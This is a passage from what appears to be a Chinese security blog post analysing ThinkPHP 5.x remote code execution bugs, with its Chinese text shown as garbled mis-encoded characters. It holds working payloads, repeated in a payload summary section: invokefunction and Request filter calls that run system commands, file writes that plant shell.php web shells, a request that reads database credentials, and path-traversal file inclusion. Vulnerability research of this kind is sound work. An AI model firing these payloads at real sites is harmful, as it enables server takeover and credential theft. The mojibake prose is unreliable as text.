href="http://tp5022.com/index.php/?s=index/a%5Cb/%E5%8F%91%E7%8E%B0%E6%9E%9C%E7%84%B6%E5%A6%82%E6%88%91%E4%BB%AC%E6%89%80%E6%96%99%EF%BC%8Cclass%E5%90%8D%E7%A7%B0%E6%88%91%E4%BB%AC%E7%8E%B0%E5%9C%A8%E5%8F%AF%E6%8E%A7%E4%BA%86%E3%80%82">http://tp5022.com/index.php/?s=index/a\b/å‘ç°æœç„¶å¦‚æˆ‘ä»¬æ‰€æ–™ï¼Œclassåç§°æˆ‘ä»¬ç°åœ¨å¯æ§äº†ã€‚</a></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724181836353.png" alt="image-20240724181836353" /></p><p>æˆ‘ä»¬æ‰¾ä¸€ä¸‹å†…éƒ¨å­˜åœ¨çš„ç±»æµ‹è¯•ä¸€ä¸‹ï¼š/index/think\app/index</p><p>å‘ç°ç±»æˆåŠŸè¿›è¡Œäº†åˆå§‹åŒ–ï¼Œçˆ†é”™æç¤ºæ–¹æ³•ä¸å­˜åœ¨è€Œå·²</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240724182230104.png" alt="image-20240724182230104" /></p><p>è¿™ä¸ªæ¼æ´åˆ°æ­¤ä¹Ÿå°±åˆ†ææˆåŠŸï¼Œå†…éƒ¨é€»è¾‘ç¼ºé™·ï¼Œå¯¼è‡´å¯ä»¥ç”¨å‘½åç©ºé—´çš„æ–¹å¼æ¥è°ƒç”¨ä»»æ„ç±»çš„ä»»æ„æ–¹æ³•ã€‚</p><p><strong>è‡³äºä¸ºä»€ä¹ˆThinkPHPå¯ä»¥ä½¿ç”¨å‘½åç©ºé—´ç›´æ¥å®ä¾‹åŒ–ï¼Œå¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š</strong></p><p><a href="https://segmentfault.com/a/1190000020172925">https://segmentfault.com/a/1190000020172925</a></p><p>ç®€å•æ€»ç»“å°±æ˜¯ï¼šæ­£å¸¸æˆ‘ä»¬éœ€è¦includeï¼Œç„¶åæ‰èƒ½å°è¯•å®ä¾‹åŒ–ï¼Œè€Œåœ¨tpä¸­ï¼Œå®ä¾‹åŒ–æ˜¯æœ‰å¦‚ä¸‹æµç¨‹çš„ï¼š</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725113342175.png" alt="image-20240725113342175" /></p><p>æ–‡ä¸­ä¹Ÿä¸¾ä¾‹äº†ï¼ˆå¦‚ä¸‹å›¾ï¼‰ï¼Œå®é™…ä¸ŠTPé»˜è®¤ç»´æŠ¤äº†ç»‘å®šæ˜ å°„å…³ç³»ï¼Œthinkå°±æ˜¯ä¸€ä¸ªæ ¹å‘½åç©ºé—´ï¼Œå…¶å¯¹åº”çš„åˆå§‹å‘½åç©ºé—´ç›®å½•å°±æ˜¯ç³»ç»Ÿçš„ç±»åº“ç›®å½•ï¼ˆthinkphp/library/thinkï¼‰</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725113510376.png" alt="image-20240725113510376" /></p><h2 id="3æ¼æ´åˆ©ç”¨"><a class="markdownIt-Anchor" href="#3æ¼æ´åˆ©ç”¨"></a> 3.æ¼æ´åˆ©ç”¨</h2><p>ç»è¿‡ä¸Šé¢çš„åˆ†æï¼Œä¾æ‰˜TPçš„å‘½åç©ºé—´å’Œè‡ªåŠ¨ç±»åŠ è½½çš„æœºåˆ¶ï¼Œæˆ‘ä»¬å·²ç»è·å–äº†å®ä¾‹åŒ–ä»»æ„ç±»çš„å…¥å£ï¼Œæ¥ä¸‹æ¥å°±æ˜¯çœ‹ä¸€ä¸‹TPæ¡†æ¶æœ¬èº«å“ªäº›æ–¹æ³•å¯ä»¥è¢«åˆ©ç”¨äº†ã€‚</p><h3 id="31é‡è§é—®é¢˜"><a class="markdownIt-Anchor" href="#31é‡è§é—®é¢˜"></a> 3.1é‡è§é—®é¢˜</h3><p>æˆ‘ä»¬åœ¨tpæ‰¾åˆ°äº†ä¸€ä¸ªæ–‡ä»¶å†™å…¥ç±»ï¼Œå‘½åç©ºé—´åº”è¯¥ä¸ºï¼š<strong>\think\template\driver\File</strong></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725140912344.png" alt="image-20240725140912344" /></p><p>ä½¿ç”¨payloadæ‰“ä¸€ä¸‹å‘ç°æç¤ºæ§åˆ¶å™¨ä¸å­˜åœ¨ï¼Œè§‚å¯Ÿä¸€ä¸‹ï¼Œ å‘ç°æ§åˆ¶å™¨çš„fileå˜æˆäº†å°å†™ï¼Œéš¾æ€ªæ‰¾ä¸åˆ°è¿™ä¸ªFileç±»</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141123558.png" alt="image-20240725141123558" /></p><p>åˆ†æäº†ä¸€ä¸‹ç›¸å…³å¤§å°å†™ç›¸å…³ä»£ç </p><ol><li>å‘ç°æœ€åˆè·å–æ§åˆ¶å™¨åå°±ä¼šè½¬æ¢æˆå°å†™ã€‚</li></ol><p>é…ç½®é‡Œçš„url_convertè¿˜ä¸ºtrueï¼Œé»˜è®¤å°±ä¼šè½¬æˆå°å†™ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141452713.png" alt="image-20240725141452713" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141402353.png" alt="image-20240725141402353" /></p><ol start="2"><li>ä¸Šé¢æåˆ°çš„tpä¼šæ ¹æ®å‘½åç©ºé—´è‡ªåŠ¨å¯»æ‰¾å¯¹åº”çš„ç±»ï¼Œ<code>\think\Loader::autoload</code></li></ol><p>å…¶ä¸­æœ‰ä¸€æ®µéWinç¯å¢ƒä¸ä¸¥æ ¼åŒºåˆ†å¤§å°å†™ï¼Œæ˜¯windowsæ— æ³•èµ°åˆ°ä¸‹é¢çš„includeï¼Œä¹Ÿå°±æ²¡åŠæ³•åŒ…å«åˆ°æ–‡ä»¶</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725141739998.png" alt="image-20240725141739998" /></p><h3 id="32æ¼æ´åˆ©ç”¨æ€»ç»“"><a class="markdownIt-Anchor" href="#32æ¼æ´åˆ©ç”¨æ€»ç»“"></a> 3.2æ¼æ´åˆ©ç”¨æ€»ç»“</h3><h4 id="tp-50x-version-5022"><a class="markdownIt-Anchor" href="#tp-50x-version-5022"></a> TP 5.0.x &lt;=version&lt;= 5.0.22</h4><p>ç”±ä¸Šé¢çš„é—®é¢˜ï¼Œç®€å•è·Ÿäº†ä¸€ä¸‹å‘ç°åœ¨windowsç¯å¢ƒä¸‹è‡ªåŠ¨åŠ è½½ç±»æ ¹æœ¬æ— æ³•åŠ è½½åˆ°æƒ³è¦ç±»æ–‡ä»¶ï¼Œæ‰€ä»¥åªèƒ½æ‰¾æ¡†æ¶åˆå§‹åŒ–çš„æ—¶å€™å°±å·²ç»åŠ è½½çš„ç±»ã€‚</p><p>åœ¨Linuxä¸€æ ·å¦‚æ­¤ï¼Œå¤„ç†å°å†™çš„æ§åˆ¶å™¨ï¼Œæ‹¼æ¥æ–‡ä»¶åè¿˜æ˜¯å°å†™ï¼Œè™½ç„¶èµ°åˆ°äº†ä¸‹é¢çš„includeï¼Œä½†æ˜¯å› ä¸ºLinuxæ–‡ä»¶ååŒºåˆ†å¤§å°å†™ï¼Œæ— æ³•åŒ…å«åˆ°ã€‚</p><pre class="line-numbers language-none"><code class="language-none">think\Routethink\Configthink\Errorthink\Appthink\Requestthink\Hookthink\Envthink\Langthink\Logthink\Loader<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°å¯ä»¥æ‰§è¡Œä»»æ„æ–¹æ³•ï¼Œä¸”å¯ä»¥æ‰§è¡Œå¸¦å‚æ•°çš„æ–¹æ³•ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725145500102.png" alt="image-20240725145500102" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725150328217.png" alt="image-20240725150328217" /></p><p><strong>æœ€ç»ˆå¯ç”¨payloadï¼š</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>var_dump<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># æ‰“å°çš„æ–¹å¼æ£€æµ‹æ¼æ´</span><span class="token operator">?</span>s<span class="token operator">=</span><span class="token operator">/</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>file_put_contents<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>shell1213<span class="token operator">.</span>php<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">123123</span> <span class="token comment"># æ–‡ä»¶å†™å…¥</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>think\config<span class="token operator">/</span>get<span class="token operator">&amp;</span>name<span class="token operator">=</span>database<span class="token operator">.</span>username <span class="token comment"># è·å–é…ç½®ä¿¡æ¯</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Lang<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>test<span class="token operator">.</span>jpg    <span class="token comment"># åŒ…å«ä»»æ„æ–‡ä»¶</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\Config<span class="token operator">/</span>load<span class="token operator">&amp;</span>file<span class="token operator">=</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span><span class="token operator">.</span><span class="token operator">.</span><span class="token operator">/</span>t<span class="token operator">.</span>php     <span class="token comment"># åŒ…å«ä»»æ„.phpæ–‡ä»¶</span><span class="token operator">?</span>s<span class="token operator">=</span>index<span class="token operator">/</span>\think\app<span class="token operator">/</span>invokefunction<span class="token operator">&amp;</span><span class="token keyword">function</span><span class="token operator">=</span>call_user_func_array<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span>system<span class="token operator">&amp;</span>vars<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span>id  <span class="token comment">#æ‰§è¡Œç³»ç»Ÿå‘½ä»¤</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="tp-51x-version-5130"><a class="markdownIt-Anchor" href="#tp-51x-version-5130"></a> TP 5.1.x &lt;=version&lt;= 5.1.30</h4><p>5.1çš„å…·ä½“æ¼æ´åˆ†ææµç¨‹å°±ä¸åˆ†æäº†ï¼Œå¤§è‡´ä¸5.0ç›¸ä¼¼ï¼Œè™½ç„¶ç›¸ä¼¼åº¦ä¸é«˜ï¼Œä½†æ˜¯ç›´æ¥å¾€ä¸‹è·Ÿæ§åˆ¶å™¨çš„èµ‹å€¼å°±è¡Œäº†</p><p>ä¸Šé¢5.0é‡åˆ°çš„é—®é¢˜ï¼Œåœ¨5.1å­˜åœ¨å—ï¼Ÿçœ‹ä¸€ä¸‹ä¸¤å¤„çš„ä»£ç ï¼š</p><ul><li>è·å–æ§åˆ¶å™¨éƒ¨åˆ†</li></ul><p>é»˜è®¤å¯¹è·å–çš„å€¼ä¹Ÿæ˜¯ä¼šå°å†™çš„</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725164747021.png" alt="image-20240725164747021" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725164730640.png" alt="image-20240725164730640" /></p><ul><li>ç±»è‡ªåŠ¨åŠ è½½éƒ¨åˆ†</li></ul><p>é€»è¾‘ä¸5.0ç›¸åŒï¼Œå†™æ³•ï¼Œä½†è¿˜æ˜¯æ— æ³•åŠ è½½</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240725164906870.png" alt="image-20240725164906870" /></p><p>åªèƒ½å¯»æ‰¾åˆå§‹åŒ–æ—¶å·²ç»åŠ è½½ï¼ˆincludeï¼‰çš„ç±»</p><pre class="line-numbers language-none"><code class="language-none">think\Loader Composer\Autoload\ComposerStaticInit289837ff5d5ea8a00f5cc97a07c04561think\Error think\Containerthink\App think\Env think\Config think\Hook think\Facadethink\facade\Envenvthink\Dbthink\Lang think\Request think\Log think\log\driver\Filethink\facade\Routeroutethink\Route think\route\Rulethink\route\RuleGroupthink\route\Domainthink\route\RuleItemthink\route\RuleNamethink\route\Dispatchthink\route\dispatch\Urlthink\route\dispatch\Modulethink\Middlewarethink\Cookiethink\Viewthink\view\driver\Thinkthink\Templatethink\template\driver\Filethink\Sessionthink\Debugthink\Cachethink\cache\Driverthink\cache\driver\File<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å‘ç°**\think\template\driver\File**ç±»åœ¨5.1å·²ç»åœ¨åˆå§‹åŒ–æ—¶å°±å·²ç»åŠ è½½ï¼Œæ‰€ä»¥å¯ä»¥ä½¿ç”¨ã€‚</p><p><strong>å¯ç”¨payloadï¼š</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">?s=index/\think\Request/input&amp;filter[]=system&amp;data=whomai # callbackå›è°ƒ?s=index/\think\view\driver\Think/display&amp;template=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span>   #shellç”Ÿæˆåœ¨runtime/temp/md5(template).php?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span> # å†™æ–‡ä»¶?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # å‘½ä»¤æ‰§è¡Œ?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id # å‘½ä»¤æ‰§è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4payloadæ±‡æ€»"><a class="markdownIt-Anchor" href="#4payloadæ±‡æ€»"></a> 4.Payloadæ±‡æ€»</h2><h3 id="tp-50"><a class="markdownIt-Anchor" href="#tp-50"></a> TP 5.0</h3><pre class="line-numbers language-none"><code class="language-none">s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;var_dump&amp;vars[0]&#x3D;123123 # æ‰“å°çš„æ–¹å¼æ£€æµ‹æ¼æ´?s&#x3D;&#x2F;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;file_put_contents&amp;vars[1][]&#x3D;shell1213.php&amp;vars[1][]&#x3D;123123 # æ–‡ä»¶å†™å…¥?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # è·å–é…ç½®ä¿¡æ¯?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # åŒ…å«ä»»æ„æ–‡ä»¶?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # åŒ…å«ä»»æ„.phpæ–‡ä»¶?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id  #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="tp-51"><a class="markdownIt-Anchor" href="#tp-51"></a> TP 5.1</h3><pre class="line-numbers language-none"><code class="language-none">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;whomai # callbackå›è°ƒ?s&#x3D;index&#x2F;\think\view\driver\Think&#x2F;display&amp;template&#x3D;&lt;?php phpinfo();?&gt;   #shellç”Ÿæˆåœ¨runtime&#x2F;temp&#x2F;md5(template).php?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt; # å†™æ–‡ä»¶?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # å‘½ä»¤æ‰§è¡Œ?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id # å‘½ä»¤æ‰§è¡Œ<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="0x03-thinkphp-5xå‘½ä»¤æ‰§è¡Œmethodä»»æ„è°ƒç”¨æ–¹æ³•å¯¼è‡´rce"><a class="markdownIt-Anchor" href="#0x03-thinkphp-5xå‘½ä»¤æ‰§è¡Œmethodä»»æ„è°ƒç”¨æ–¹æ³•å¯¼è‡´rce"></a> 0x03 ThinkPHP 5.xå‘½ä»¤æ‰§è¡Œï¼ˆmethodä»»æ„è°ƒç”¨æ–¹æ³•å¯¼è‡´RCEï¼‰</h1><h2 id="1å½±å“ç‰ˆæœ¬-2"><a class="markdownIt-Anchor" href="#1å½±å“ç‰ˆæœ¬-2"></a> 1.å½±å“ç‰ˆæœ¬</h2><p>ThinkPHP v5.0.x &lt;=x&lt;= 5.0.23</p><p>ThinkPHP v5.1.x &lt;=x&lt;= 5.1.32</p><p>çœ‹ä¸€ä¸‹patchï¼š</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240726150103603.png" alt="image-20240726150103603" /></p><p>ç®€å•åˆ†æäº†ä¸‹ï¼Œå‘ç°å¯¹POSTå‚æ•°è¿›è¡Œäº†ç™½åå•åˆ¤æ–­ï¼Œé™å®šäº†POSTè·å–çš„var_methodå‚æ•°ã€‚</p><h2 id="2æ¼æ´åˆ†æ-2"><a class="markdownIt-Anchor" href="#2æ¼æ´åˆ†æ-2"></a> 2.æ¼æ´åˆ†æ</h2><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œå¾ˆå®¹æ˜“æƒ³åˆ°åˆ©ç”¨æ–¹å¼ï¼š</p><ul><li>methodä»POSTå‚æ•°è·å–å¹¶è½¬ä¸ºå¤§å†™ï¼ˆPHPçš„å‡½æ•°æ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„ï¼Œæ‰€ä»¥è½¬å¤§å†™ä¹Ÿæ— æ‰€è°“äº†ï¼‰</li><li>æ¥ä¸‹æ¥ä¼šè°ƒç”¨Requestç±»çš„å¯¹åº”æ–¹æ³•ï¼Œå‚æ•°ä¸ºPOSTå‚æ•°</li></ul><p>åªè¦æ‰¾Requestç±»ä¸­å¯ä»¥è¢«åˆ©ç”¨çš„æ–¹æ³•ï¼ˆæ–¹æ³•å‚æ•°åªèƒ½æœ‰1ä¸ªï¼‰å°±å¯ä»¥äº†ã€‚</p><p>æ‰¾äº†ä¸€åœˆå‘ç°ä¸å­˜åœ¨ç›´æ¥åˆ©ç”¨çš„ï¼Œå‘ç°æœ‰ä¸€ä¸ªå¯ä»¥è¦†ç›–ä»»æ„å±æ€§çš„__contructæ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240726180501090.png" alt="image-20240726180501090" /></p><p>æ¥ä¸‹æ¥çš„æ€è·¯å°±æ˜¯å¯»æ‰¾TPæ¡†æ¶æ¥æ”¶å‚æ•°æˆ–è€…å¤„ç†è·¯ç”±çš„æ—¶å€™æ˜¯å¦ä¼šè°ƒç”¨Requestçš„å‚æ•°äº†ï¼Œè¿™æ ·çš„è¯æˆ‘ä»¬å°±èƒ½åˆ©ç”¨æ­¤ç±»èµ‹å€¼æ¶æ„å±æ€§ï¼Œè¾¾æˆåˆ©ç”¨æ•ˆæœäº†ã€‚</p><p>ä½†åœ¨å¼€å§‹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆç®€å•è·Ÿä¸€ä¸‹ï¼Œå¦‚ä½•å¯ä»¥è§¦å‘æœ€å¼€å§‹çš„diffçš„ä½ç½®</p><p>Requestæ˜¯TPå¤„ç†è¯·æ±‚çš„ç±»ï¼Œåªè¦å‘èµ·è¯·æ±‚å°±ä¼šè§¦å‘åˆ°æ­¤ç±»ï¼Œmethodæ˜¯å¤„ç†è·¯ç”±çš„æ–¹æ³•ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“è§¦å‘diffä½ç½®ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727171455416.png" alt="image-20240727171455416" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727153232409.png" alt="image-20240727153232409" /></p><p>æ¥ä¸‹æ¥å°±æ˜¯å¯»æ‰¾å¯èƒ½åˆ©ç”¨Requestä¸­æ¶æ„å‚æ•°çš„ä½ç½®äº†ï¼Œå¤§è‡´çš„æŒ–æ˜æ€è·¯å¦‚ä¸‹ï¼š</p><ul><li>ä»TPçš„å…¥å£å¼€å§‹è·Ÿï¼Œå‘ç°è°ƒç”¨Requestçš„æ–¹æ³•å°±è·Ÿè¿›å»</li><li>ç„¶åå†çœ‹æ–¹æ³•å¯ä¸å¯ä»¥è¿›è¡Œæ¶æ„åˆ©ç”¨ï¼ˆå†™æ–‡ä»¶ï¼Œcallbackæ‰§è¡Œç­‰ï¼‰ï¼Œ</li><li>æœ€åçœ‹å‚æ•°æ˜¯å¦å¯æ§</li></ul><ol><li><p>å…¥å£ç‚¹ä¸ºAPP çš„runé™æ€æ–¹æ³•</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727155146208.png" alt="image-20240727155146208" /></p></li><li><p>è·Ÿå…¥paramæ–¹æ³•ï¼Œrequestå˜é‡ä¸ºåˆå§‹åŒ–çš„Requestç±»å¯¹è±¡</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727155758652.png" alt="image-20240727155758652" /></p></li><li><p>è·Ÿå…¥æ–¹æ³•ï¼Œå‘ç°methodæ–¹æ³•ï¼Œç»§ç»­è·Ÿå…¥</p></li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802155452448.png" alt="image-20240802155452448" /></p><ol start="4"><li>å‚æ•°ä¸ºtrueï¼Œä¼šè°ƒç”¨åˆ°serveræ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802155537768.png" alt="image-20240802155537768" /></p><ol start="5"><li>è°ƒç”¨serveræ–¹æ³•ï¼Œè·Ÿå…¥å…¶ä¸­çš„inputæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802155613522.png" alt="image-20240802155613522" /></p><ol start="6"><li>çœ‹ä¸€ä¸‹å…¶ä¸­çš„filterValueæ–¹æ³•</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727160127104.png" alt="image-20240727160127104" /></p><ol start="7"><li>å‘ç°callbackè§¦å‘ç‚¹</li></ol><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727160212522.png" alt="image-20240727160212522" /></p><p>åˆ©ç”¨æµç¨‹å·²ç»æ•´ç†å¥½äº†ï¼Œè¦å®Œæˆå®Œæ•´çš„åˆ©ç”¨é“¾ï¼Œè¿˜è¦è€ƒè™‘ä¸¤ç‚¹ï¼š</p><ul><li><ol><li>æ•´ä¸ªè¿‡ç¨‹ä¸­çš„ifæ¡ä»¶éƒ½èƒ½ç¬¦åˆå—ï¼Ÿ</li></ol></li><li><ol start="2"><li>è¿˜æœ‰æ²¡æœ‰å…¶ä»–çš„è°ƒç”¨æœ€åˆparamæ–¹æ³•çš„ä½ç½®ï¼Ÿ</li></ol></li></ul><h3 id="21é‡è§é—®é¢˜éœ€è¦å¼€å¯debugçš„åˆ©ç”¨é“¾"><a class="markdownIt-Anchor" href="#21é‡è§é—®é¢˜éœ€è¦å¼€å¯debugçš„åˆ©ç”¨é“¾"></a> 2.1é‡è§é—®é¢˜ï¼ˆéœ€è¦å¼€å¯debugçš„åˆ©ç”¨é“¾ï¼‰</h3><p>æˆ‘ä»¬çœ‹å›æ¼æ´åˆ†æ2æ­¥éª¤çš„ifé€»è¾‘ï¼Œçœ‹ä¸€ä¸‹debugçš„é™æ€å±æ€§æ˜¯ä»€ä¹ˆå«ä¹‰ã€‚</p><p>åˆ†æäº†ä¸€ä¸‹è¯¥å˜é‡å°±æ˜¯ç³»ç»Ÿdebugé…ç½®ï¼Œç±»è°ƒç”¨runæ–¹æ³•æ—¶ä¼šè¿›è¡Œå±æ€§çš„åˆå§‹åŒ–ã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬æƒ³è§¦å‘ä¸Šé¢çš„è°ƒç”¨é“¾ï¼Œç¬¬ä¸€ä¸ªifæ¡ä»¶å°±è¦ç¬¦åˆï¼Œä¹Ÿå°±æ˜¯è¯´<strong>ç³»ç»Ÿéœ€è¦å¼€å¯debugæ¨¡å¼æ‰è¡Œ</strong>ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727161239734.png" alt="image-20240727161239734" /></p><p>å…ˆè°ƒé€šPayloadï¼Œåœ¨é“¾æ¡ä¸­æ‰¾åˆ°å¯è¢«èµ‹å€¼çš„Requestçš„å±æ€§</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727174846709.png" alt="image-20240727174846709" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240727174908476.png" alt="image-20240727174908476" /></p><p>ç°åœ¨å¯ä»¥POSTä¼ å‚å¯¹ç±»çš„filterå±æ€§èµ‹å€¼äº†ï¼Œ$filterä¹Ÿå°±æ˜¯callbackä¸­è°ƒç”¨çš„å‡½æ•°</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802144020516.png" alt="image-20240802144020516" /></p><p>æ¥ä¸‹æ¥å°±æ˜¯callbackçš„å‡½æ•°å‚æ•°çš„å€¼äº†ï¼Œåœ¨è¿™é‡Œå°±æ˜¯filterValueå‡½æ•°çš„$dataå‚æ•°äº†ï¼Œæ‰¾ä¸€ä¸‹èµ‹å€¼çš„åœ°æ–¹ã€‚</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802144908829.png" alt="image-20240802144908829" /></p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802144825176.png" alt="image-20240802144825176" /></p><p>è·Ÿå›å»èµ‹å€¼$dataçš„åœ°æ–¹ï¼Œå‘ç°ä¹Ÿæ˜¯Requestç±»çš„å±æ€§ï¼Œæ‰€ä»¥ä¸€æ ·å¯ä»¥ä½¿ç”¨ä¸Šé¢çš„æ–¹å¼</p><p>æˆ‘ä»¬ä½¿ç”¨serverå˜é‡èµ‹å€¼ï¼Œèµ°åˆ°filterValueå‡½æ•°ä¸Šé¢çš„ifé€»è¾‘ï¼Œå‘ç°æ— æ³•æ»¡è¶³è¿™ä¸ªifï¼Œä¼šç›´æ¥returnï¼Œæ— æ³•è§¦å‘ä¸Šé¢çš„filterValueå‡½æ•°</p><p><img src="C:%5CUsers%5C14198%5Cblog%5Cpublic%5Ctypora-user-images%5Cimage-20240802153133966.png" 